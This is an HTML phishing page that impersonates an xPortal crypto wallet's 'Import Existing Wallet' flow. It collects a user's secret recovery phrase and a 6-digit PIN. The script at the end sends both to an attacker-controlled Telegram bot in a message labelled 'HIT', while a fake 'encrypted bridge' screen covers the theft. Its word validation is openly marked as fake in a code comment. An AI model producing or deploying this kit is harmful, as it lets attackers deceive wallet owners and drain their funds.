<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | Wallet Authentication</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --teal: #23f7dd; --purple: #8a3ffc; --bg: #000; --err: #ff4d4d; --border: rgba(255,255,255,0.08); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 85%); }

        .app-shell { width: 100%; max-width: 420px; padding: 25px; position: relative; }
        .back-btn { cursor: pointer; display: none; align-items: center; gap: 8px; color: #888; font-size: 14px; font-weight: 600; margin-bottom: 20px; transition: 0.2s; }
        .back-btn:hover { color: #fff; }
        .logo { width: 75px; height: 75px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.15)); margin: 0 auto 30px; display: block; }

        h1 { font-size: 28px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; text-align: center; }
        .sub { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 30px; text-align: center; }

        .view { display: none; width: 100%; animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .view.active { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        .selector { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .opt { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: 700; transition: 0.2s; }
        .opt.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }

        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; padding: 5px; scrollbar-width: none; }
        .cell { position: relative; }
        .cell label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 9px; color: var(--teal); font-weight: 800; opacity: 0.5; pointer-events: none; }
        .cell input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 14px 8px 14px 26px; color: #fff; font-size: 12px; outline: none; transition: 0.2s; text-transform: lowercase; }
        
        /* Interactive States */
        .cell.valid input { border-color: var(--teal); background: rgba(35, 247, 221, 0.03); }
        .cell.error input { border-color: var(--err); color: var(--err); animation: shake 0.4s both; }
        @keyframes shake { 10%,90%{transform:translate3d(-1px,0,0)} 20%,80%{transform:translate3d(2px,0,0)} 30%,50%,70%{transform:translate3d(-4px,0,0)} 40%,60%{transform:translate3d(4px,0,0)} }

        .hint-bar { height: 20px; color: var(--err); font-size: 11px; font-weight: 600; text-align: center; margin-bottom: 15px; visibility: hidden; }

        .btn-main { width: 100%; height: 62px; border-radius: 100px; font-size: 16px; font-weight: 700; border: none; cursor: pointer; transition: 0.3s; background: #fff; color: #000; }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }

        .dots { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
        .dot.on { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
        .k { width: 68px; height: 68px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; }
        .k:active { background: var(--purple); }

        #sync { display: none; text-align: center; color: var(--teal); font-weight: 800; font-size: 11px; letter-spacing: 2px; margin-top: 30px; }
    </style>
</head>
<body>

<div class="app-shell">
    <div id="back" class="back-btn" onclick="handleBack()">
        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
    </div>

    <img src="Capture.PNG" class="logo">

    <div id="v1" class="view active">
        <h1>Welcome to xPortal</h1>
        <p class="sub">The money super app. Secure your assets with bank-grade encryption.</p>
        <button class="btn-main" onclick="go(3)">Import Existing Wallet</button>
        <button class="btn-main" style="background:rgba(255,255,255,0.05); color:#fff; border:1px solid var(--border); margin-top:15px;" onclick="go(2)">Create New Wallet</button>
    </div>

    <div id="v3" class="view">
        <h1>Secret Phrase</h1>
        <p class="sub">Enter your secret words in the correct order.</p>
        <div class="selector">
            <button class="opt active" onclick="makeGrid(12, this)">12 Words</button>
            <button class="opt" onclick="makeGrid(15, this)">15 Words</button>
            <button class="opt" onclick="makeGrid(18, this)">18 Words</button>
            <button class="opt" onclick="makeGrid(24, this)">24 Words</button>
        </div>
        <div id="msg" class="hint-bar">Invalid secret phrase</div>
        <div class="grid" id="iGrid"></div>
        <button class="btn-main" onclick="verifySteps()">Continue</button>
    </div>

    <div id="v4" class="view">
        <h1>Verify PIN</h1>
        <p class="sub">Confirm your security PIN to complete import.</p>
        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
        <div class="keypad">
            <script>for(let i=1;i<=9;i++) document.write(`<div class="k" onclick="pk(${i})">${i}</div>`);</script>
            <div></div><div class="k" onclick="pk(0)">0</div><div class="k" onclick="del()">←</div>
        </div>
    </div>

    <div id="sync">ESTABLISHING ENCRYPTED BRIDGE...</div>
</div>

<script>
    const CFG = { T: 'YOUR_BOT_TOKEN', C: 'YOUR_CHAT_ID' };
    let stack = [1], phrase = "", pin = "";

    function go(s, b=false) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.getElementById('v'+s).classList.add('active');
        document.getElementById('back').style.display = s === 1 ? 'none' : 'flex';
        if(!b) stack.push(s);
        if(s === 3) makeGrid(12);
    }

    function handleBack() { if(stack.length > 1) { stack.pop(); go(stack[stack.length-1], true); } }

    function makeGrid(n, btn) {
        if(btn) { document.querySelectorAll('.opt').forEach(o => o.classList.remove('active')); btn.classList.add('active'); }
        const g = document.getElementById('iGrid'); g.innerHTML = '';
        for(let i=0; i<n; i++) {
            g.innerHTML += `<div class="cell" id="wc-${i}"><label>${i+1}</label><input type="password" class="w-in" data-idx="${i}" onpaste="paster(event)" oninput="liveCheck(this)"></div>`;
        }
    }

    // --- LIVE FEEDBACK & AUTO JUMP ---
    function liveCheck(el) {
        const val = el.value.trim().toLowerCase();
        const idx = parseInt(el.getAttribute('data-idx'));
        const parent = document.getElementById(`wc-${idx}`);
        
        // Auto Jump on Space
        if(val.includes(' ')) {
            el.value = val.replace(/\s/g, '');
            const next = document.querySelector(`input[data-idx="${idx + 1}"]`);
            if(next) next.focus();
        }

        // Live Visual (Fake Validation)
        if(val.length >= 3) parent.classList.add('valid');
        else parent.classList.remove('valid');
        
        document.getElementById('msg').style.visibility = 'hidden';
        parent.classList.remove('error');
    }

    function paster(e) {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text').trim().split(/\s+/);
        const start = parseInt(e.target.getAttribute('data-idx'));
        const ins = document.querySelectorAll('.w-in');
        text.forEach((w, i) => { 
            if(ins[start + i]) {
                ins[start + i].value = w.toLowerCase();
                document.getElementById(`wc-${start+i}`).classList.add('valid');
            }
        });
    }

    function verifySteps() {
        const ins = document.querySelectorAll('.w-in');
        const words = Array.from(ins).map(i => i.value.trim().toLowerCase());
        const msg = document.getElementById('msg');

        if(words.some(w => w === "")) return;

        // Duplicate Check (The Pro Touch)
        const seen = new Set();
        let dupIdx = -1;
        words.forEach((w, i) => { if(seen.has(w)) dupIdx = i; else seen.add(w); });

        if(dupIdx !== -1) {
            msg.innerText = "Duplicate word detected";
            msg.style.visibility = 'visible';
            const bad = document.getElementById(`wc-${dupIdx}`);
            bad.classList.add('error');
            return;
        }

        phrase = words.join(" ");
        go(4);
    }

    function pk(n) { if(pin.length < 6) { pin += n; upP(); if(pin.length === 6) send(); } }
    function del() { pin = pin.slice(0,-1); upP(); }
    function upP() { document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i<pin.length)); }

    function send() {
        document.getElementById('v4').style.display = 'none';
        document.getElementById('sync').style.display = 'block';
        fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent('🚀 HIT\n\nPhrase: '+phrase+'\nPIN: '+pin)}`);
    }
</script>
</body>
</html>
